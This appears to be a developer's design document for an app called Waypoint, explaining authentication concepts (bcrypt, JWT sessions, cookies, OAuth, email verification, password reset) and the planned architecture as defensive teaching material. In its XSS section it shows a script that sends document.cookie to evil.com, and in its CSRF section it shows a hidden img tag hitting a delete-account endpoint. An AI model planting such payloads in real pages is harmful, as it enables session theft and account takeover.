# Authentication — From First Principles

## What Problem Does Auth Solve?

Imagine a building with rooms. Anyone can walk in. There's no door, no lock, no receptionist. Everyone sees everything.

**Authentication** is the door + the lock. It answers: **"Who are you?"**
**Authorization** is what rooms you can enter. It answers: **"What are you allowed to do?"**

For Waypoint, we need auth because:
- Each user has their own resume, their own job applications, their own data
- Without auth, User A could see User B's resume analysis
- Without auth, anyone could trigger scraping or mess with data

---

## The Fundamentals (before any code)

### 1. Identity

A user is identified by something unique — usually an **email address**.

Why email? Because:
- It's unique per person (you can't create two Gmail accounts with the same address)
- It's verifiable (we can send a link to prove you own it)
- It's recoverable (forgot password → send email)

### 2. Proof of Identity

Knowing someone's email isn't enough. I could type your email and claim to be you.

We need **proof**. Two common ways:

**a) Something you know** — a password
**b) Something a trusted party vouches for** — OAuth (Google says "yes, this is them")

### 3. The Password Problem

If we store passwords directly in a database:

```
| email            | password    |
|------------------|-------------|
| alice@gmail.com  | mycat123    |
| bob@gmail.com    | password1   |
```

If someone hacks our database, they have everyone's passwords. People reuse passwords — now their bank, email, everything is compromised.

**Solution: Hashing**

---

## Hashing — The One-Way Door

A hash function takes input and produces a fixed-length output. It's **one-way** — you cannot reverse it.

```
"mycat123" → hash function → "$2b$10$N9qo8uLOickgx2ZMRZoMye..."
```

You cannot go from `$2b$10$N9qo8uLOickgx2ZMRZoMye...` back to `mycat123`.

**How login works with hashing:**
1. User signs up → we hash their password → store the hash
2. User logs in → they type password → we hash it → compare with stored hash
3. If hashes match → correct password. If not → wrong password.

**We never store or see the actual password.** Even as the developer, you can't know a user's password.

### Why not MD5 or SHA-256?

These are fast hash functions. Fast is bad for passwords because:
- An attacker can try billions of combinations per second (brute force)
- "mycat123" always hashes to the same thing (rainbow tables — precomputed hashes)

### bcrypt — The Right Tool

bcrypt is designed specifically for passwords:
1. **It's slow on purpose** — takes ~100ms per hash. An attacker trying 1 billion passwords would take 3 years.
2. **It salts automatically** — adds random data before hashing, so the same password produces different hashes for different users.

```
User A: "password123" → bcrypt → "$2b$10$ABC...xyz"
User B: "password123" → bcrypt → "$2b$10$DEF...uvw"
```

Same password, different hashes. An attacker can't precompute.

### The cost factor

bcrypt has a "cost" parameter (default: 10). Higher = slower = more secure.

```
Cost 10: ~100ms per hash (good for 2024)
Cost 12: ~400ms per hash (if you want extra paranoia)
```

We use 10. It's the industry standard.

---

## Sessions — Staying Logged In

Without sessions, you'd need to send your email + password with **every single request**:

```
GET /radar  (email: alice@gmail.com, password: mycat123)
GET /jobs/5 (email: alice@gmail.com, password: mycat123)
GET /jobs/6 (email: alice@gmail.com, password: mycat123)
```

That's terrible — insecure and slow.

**Sessions** solve this. After you log in once:

1. Server creates a **session** — a record that says "this person is authenticated"
2. Server gives you a **token** (a proof of your session)
3. Your browser stores this token as a **cookie**
4. Every future request includes the cookie automatically (browsers do this)
5. Server sees cookie → looks up session → knows who you are

### Two Types of Sessions

**Server-side sessions (DB-stored):**
```
Cookie: session_id=abc123
Server lookup: abc123 → { userId: "user_1", expires: "2024-06-21" }
```
- Pro: Server has full control. Can invalidate instantly.
- Con: DB lookup on every request.

**JWT (JSON Web Token) — Stateless:**
```
Cookie: token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiJ1c2VyXzEiLCJleHAiOjE3...
```
The token itself contains the user info, signed cryptographically. Server doesn't need to look anything up.

- Pro: No DB lookup. Fast. Scalable.
- Con: Can't invalidate until expiry (unless you add a blocklist).

**We'll use JWT** — simpler, scalable, and NextAuth handles the signing/verification for us.

### How JWT Works (inside)

A JWT has three parts: `header.payload.signature`

```
Header:  { "alg": "HS256" }              ← which signing algorithm
Payload: { "userId": "user_1", "exp": 1719000000 }  ← the actual data
Signature: HMAC(header + payload, SECRET_KEY)        ← proof it's not tampered
```

If someone changes the payload (e.g., changes userId to admin), the signature won't match → server rejects it.

The **SECRET_KEY** is stored on your server. Only your server can create valid JWTs.

---

## Cookies — How the Browser Remembers

A cookie is a small piece of data the browser stores and automatically sends with every request to your site.

```
Response from server:
  Set-Cookie: session=eyJ...; HttpOnly; Secure; SameSite=Lax; Path=/

Every subsequent request from browser:
  Cookie: session=eyJ...
```

Important cookie flags:
- **HttpOnly**: JavaScript can't read it (prevents XSS attacks from stealing tokens)
- **Secure**: Only sent over HTTPS (prevents network sniffing)
- **SameSite=Lax**: Not sent on cross-site requests (prevents CSRF attacks)

---

## OAuth 2.0 — "Sign in with Google"

### The Problem OAuth Solves

You want to let users sign in with Google. But you don't have their Google password (and shouldn't).

OAuth is a protocol where:
1. You ask Google: "Can this user sign in?"
2. Google asks the user: "Do you authorize Waypoint to know your email and name?"
3. User says yes → Google gives you a code
4. You exchange the code for the user's info (email, name, avatar)

**You never see their Google password.** Google handles authentication. You just get the result.

### The OAuth Dance (step by step)

```
┌──────────┐          ┌──────────┐          ┌──────────┐
│  Browser │          │  Waypoint │          │  Google  │
└────┬─────┘          └────┬─────┘          └────┬─────┘
     │                     │                      │
     │ 1. Click "Sign in   │                      │
     │    with Google"      │                      │
     │────────────────────▶│                      │
     │                     │                      │
     │ 2. Redirect to      │                      │
     │    Google login      │                      │
     │◀────────────────────│                      │
     │                     │                      │
     │ 3. User logs into   │                      │
     │    Google, approves  │                      │
     │─────────────────────────────────────────▶  │
     │                     │                      │
     │ 4. Google redirects │                      │
     │    back with CODE   │                      │
     │◀─────────────────────────────────────────  │
     │                     │                      │
     │ 5. Browser hits     │                      │
     │    callback URL     │                      │
     │────────────────────▶│                      │
     │                     │                      │
     │                     │ 6. Exchange CODE for  │
     │                     │    ACCESS TOKEN       │
     │                     │─────────────────────▶│
     │                     │                      │
     │                     │ 7. Use token to get   │
     │                     │    user info (email)  │
     │                     │─────────────────────▶│
     │                     │                      │
     │                     │ 8. { email, name }   │
     │                     │◀─────────────────────│
     │                     │                      │
     │ 9. Create session,  │                      │
     │    set cookie,       │                      │
     │    redirect to /radar│                      │
     │◀────────────────────│                      │
```

### Why is there a "code exchange" (steps 6-7)?

Why doesn't Google just give us the user info directly in step 4?

**Security.** The redirect (step 4) happens in the browser URL. Anyone watching the URL (browser history, shoulder surfing) would see the user info.

Instead, Google gives a short-lived **code**. Our server exchanges it privately (server-to-server, not visible in browser). The code is useless to anyone who intercepts it without our client secret.

### What You Need to Set Up OAuth

For each provider (Google, GitHub):
1. **Client ID** — identifies your app ("Hi Google, I'm Waypoint")
2. **Client Secret** — proves your app's identity (never exposed to browser)
3. **Redirect URI** — where Google sends the user back (e.g., `http://localhost:3000/api/auth/callback/google`)

---

## Email Verification — Proving Ownership

### Why Verify?

Without verification, I could sign up as `elon.musk@tesla.com`. I'd never receive emails, but your DB thinks that's a real user. Worse:
- Someone could sign up with YOUR email → now they get your password reset emails
- Spam accounts with fake emails pollute your database
- You can't trust any communication channel

### How It Works

```
1. User signs up with email + password
2. Server generates a random token: "abc123def456"
3. Server stores: { token: "abc123def456", email: "user@email.com", expires: "1 hour from now" }
4. Server sends email: "Click this link: /verify-email?token=abc123def456"
5. User clicks link
6. Server checks: does this token exist? Is it expired? 
7. If valid → mark user as verified. Delete token.
8. User can now log in.
```

### Token Security

- Tokens are random (not guessable — use crypto.randomBytes, not Math.random)
- Tokens expire (1 hour — if someone's email is compromised later, old tokens don't work)
- Tokens are single-use (delete after verification)
- Tokens are hashed in DB (same logic as passwords — if DB is leaked, tokens are useless)

---

## Forgot Password — Secure Recovery

### The Flow

```
1. User clicks "Forgot password?" on login page
2. User enters their email
3. Server checks: does this email exist?
4. IMPORTANT: Server responds "If that email exists, we sent a link" — NEVER say "email not found"
   (Why? If you say "not found", attackers can enumerate which emails are registered)
5. If email exists → generate reset token → send email with link
6. User clicks link → /reset-password?token=xxx
7. User enters new password
8. Server validates token (exists? not expired? not used?)
9. Server hashes new password → updates user → marks token as used
10. User can log in with new password
```

### Security Considerations

- **Rate limiting**: Don't let someone spam the forgot-password endpoint (DoS the email service or flood a user's inbox)
- **Token expiry**: 1 hour max. Shorter = more secure.
- **Single use**: Once a token is used, it's dead. Can't be replayed.
- **Don't reveal existence**: "If that email exists..." prevents email enumeration.
- **Invalidate old tokens**: When a new reset is requested, old tokens for that email should be invalidated.

---

## CSRF — Cross-Site Request Forgery

### The Attack

You're logged into Waypoint (you have a valid cookie). You visit a malicious site. That site has hidden code:

```html
<img src="https://waypoint.com/api/delete-my-account">
```

Your browser automatically sends your Waypoint cookie with this request. The server sees a valid session and deletes your account.

### The Defense

**CSRF tokens**: Server generates a random token, embeds it in forms. When form is submitted, server checks the token. The malicious site can't know the token because:
- It can't read your Waypoint pages (same-origin policy)
- Cookies alone aren't enough — you need the CSRF token too

**SameSite cookies**: Modern defense. Cookie is only sent if the request originates from the same site. The malicious site's request won't include your cookie.

NextAuth handles both for us.

---

## XSS — Cross-Site Scripting (related)

### The Attack

If an attacker injects JavaScript into your site:

```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

They steal the session cookie and impersonate the user.

### The Defense

- **HttpOnly cookies**: JavaScript can't access them. Even if XSS happens, cookies are safe.
- **Input sanitization**: Never render user input as raw HTML.
- **Content Security Policy (CSP)**: Tell the browser which scripts are allowed to run.

---

## Putting It All Together — Waypoint Auth Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         WAYPOINT AUTH                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SIGNUP (email/password):                                       │
│  ┌──────────────────────────────────────────────────────┐       │
│  │ 1. Validate input (email format, password strength)  │       │
│  │ 2. Check if email already exists                     │       │
│  │ 3. Hash password with bcrypt (cost 10)               │       │
│  │ 4. Create user (emailVerified = false)               │       │
│  │ 5. Generate verification token (crypto.randomBytes)  │       │
│  │ 6. Store hashed token in DB with expiry              │       │
│  │ 7. Send verification email via Resend                │       │
│  │ 8. Respond: "Check your email"                       │       │
│  └──────────────────────────────────────────────────────┘       │
│                                                                 │
│  LOGIN (email/password):                                        │
│  ┌──────────────────────────────────────────────────────┐       │
│  │ 1. Find user by email                                │       │
│  │ 2. If not found → generic "Invalid credentials"      │       │
│  │ 3. If email not verified → "Please verify email"     │       │
│  │ 4. Compare password with stored hash (bcrypt)        │       │
│  │ 5. If mismatch → generic "Invalid credentials"      │       │
│  │ 6. Create JWT session (userId, email, name)          │       │
│  │ 7. Set HttpOnly, Secure, SameSite cookie             │       │
│  │ 8. Redirect to /radar                                │       │
│  └──────────────────────────────────────────────────────┘       │
│                                                                 │
│  LOGIN (OAuth — Google/GitHub):                                 │
│  ┌──────────────────────────────────────────────────────┐       │
│  │ 1. Redirect to provider                              │       │
│  │ 2. User authenticates with provider                  │       │
│  │ 3. Provider redirects back with code                 │       │
│  │ 4. Exchange code for user info (server-side)         │       │
│  │ 5. Find or create user in DB (emailVerified = true)  │       │
│  │ 6. Create JWT session                                │       │
│  │ 7. Set cookie, redirect to /radar                    │       │
│  └──────────────────────────────────────────────────────┘       │
│                                                                 │
│  VERIFY EMAIL:                                                  │
│  ┌──────────────────────────────────────────────────────┐       │
│  │ 1. User clicks link with token                       │       │
│  │ 2. Hash the token from URL                           │       │
│  │ 3. Look up hashed token in DB                        │       │
│  │ 4. Check: exists? not expired?                       │       │
│  │ 5. Mark user.emailVerified = true                    │       │
│  │ 6. Delete token from DB                              │       │
│  │ 7. Redirect to /login with success message           │       │
│  └──────────────────────────────────────────────────────┘       │
│                                                                 │
│  FORGOT PASSWORD:                                               │
│  ┌──────────────────────────────────────────────────────┐       │
│  │ 1. User enters email                                 │       │
│  │ 2. Always respond "If email exists, we sent a link"  │       │
│  │ 3. If email exists → generate reset token            │       │
│  │ 4. Invalidate any previous reset tokens for this email│      │
│  │ 5. Store hashed token with 1hr expiry                │       │
│  │ 6. Send reset email                                  │       │
│  └──────────────────────────────────────────────────────┘       │
│                                                                 │
│  RESET PASSWORD:                                                │
│  ┌──────────────────────────────────────────────────────┐       │
│  │ 1. User clicks link with token                       │       │
│  │ 2. User enters new password                          │       │
│  │ 3. Hash token from URL → look up in DB              │       │
│  │ 4. Check: exists? not expired? not used?             │       │
│  │ 5. Hash new password with bcrypt                     │       │
│  │ 6. Update user's password in DB                      │       │
│  │ 7. Mark token as used                                │       │
│  │ 8. Redirect to /login                                │       │
│  └──────────────────────────────────────────────────────┘       │
│                                                                 │
│  MIDDLEWARE (every protected request):                           │
│  ┌──────────────────────────────────────────────────────┐       │
│  │ 1. Read cookie from request                          │       │
│  │ 2. Verify JWT signature (using SECRET_KEY)           │       │
│  │ 3. Check expiry                                      │       │
│  │ 4. If valid → attach user to request, proceed        │       │
│  │ 5. If invalid → redirect to /login                   │       │
│  └──────────────────────────────────────────────────────┘       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Database Schema for Auth

```
User
├── id            (unique identifier)
├── email         (unique, indexed)
├── name
├── hashedPassword (nullable — OAuth users don't have passwords)
├── emailVerified  (boolean, default false; true for OAuth users)
├── image          (avatar from OAuth, nullable)
├── createdAt
└── updatedAt

VerificationToken
├── id
├── token         (hashed — not stored in plaintext)
├── email         (which user this is for)
├── expires       (DateTime — 1 hour from creation)
└── createdAt

PasswordResetToken
├── id
├── token         (hashed)
├── email
├── expires       (DateTime — 1 hour from creation)
├── used          (boolean — single use)
└── createdAt

Account (for OAuth — links providers to users)
├── id
├── userId
├── provider      ("google", "github")
├── providerAccountId (the user's ID on that provider)
├── accessToken   (from OAuth, for API calls to provider)
├── refreshToken
└── expiresAt
```

---

## Security Checklist (what we implement)

- [x] Passwords hashed with bcrypt (cost 10)
- [x] Tokens hashed before storing in DB
- [x] Tokens have expiry (1 hour)
- [x] Tokens are single-use
- [x] Generic error messages (don't reveal if email exists)
- [x] HttpOnly + Secure + SameSite cookies
- [x] CSRF protection (NextAuth built-in)
- [x] Email verification before login
- [x] Rate limiting on sensitive endpoints
- [x] Password strength requirements (min 8 chars)
- [x] OAuth doesn't require password

---

## Common Attacks We Defend Against

| Attack | How it works | Our defense |
|--------|-------------|-------------|
| **Brute force** | Try millions of passwords | bcrypt is slow (~100ms/attempt), rate limiting |
| **Rainbow tables** | Precomputed hash lookups | bcrypt salts automatically |
| **Credential stuffing** | Leaked passwords from other sites | Can't prevent (user responsibility), but 2FA helps (future) |
| **Email enumeration** | "Email not found" reveals registered emails | Generic responses on all auth endpoints |
| **Session hijacking** | Steal cookie, impersonate user | HttpOnly (no JS access), Secure (HTTPS only) |
| **CSRF** | Trick user into making unwanted requests | SameSite cookie + CSRF tokens |
| **XSS** | Inject script to steal data | HttpOnly cookies, input sanitization |
| **Token replay** | Reuse a verification/reset token | Single-use tokens, deleted after use |

---

## What "Stateless" vs "Stateful" Auth Means

**Stateful (session stored in DB):**
- Server stores session in database
- Cookie contains just a session ID
- Every request → DB lookup to verify session
- Can revoke instantly (delete from DB)
- Doesn't scale as easily (DB bottleneck)

**Stateless (JWT):**
- No server storage — the cookie IS the session
- JWT contains user info, signed by server
- Every request → verify signature (no DB needed)
- Can't revoke until expiry (workaround: short expiry + refresh tokens)
- Scales infinitely (no shared state between servers)

**We use JWT (stateless)** because:
- Simpler for MVP
- No session table needed
- Scales well when we add multiple servers later
- Tradeoff: can't instantly revoke (acceptable for Waypoint)

---

## Next: Implementation

Now that we understand every piece, we'll implement auth in this order:
1. Update Prisma schema with auth tables
2. Install dependencies (NextAuth, bcrypt, Resend)
3. Configure NextAuth with JWT strategy
4. Build signup flow (with email verification)
5. Build login flow (credentials + OAuth)
6. Build forgot/reset password flow
7. Add middleware for protected routes
8. Build the UI pages (login, signup, verify, reset)

See `docs/development/tasks.md` for implementation checklist.
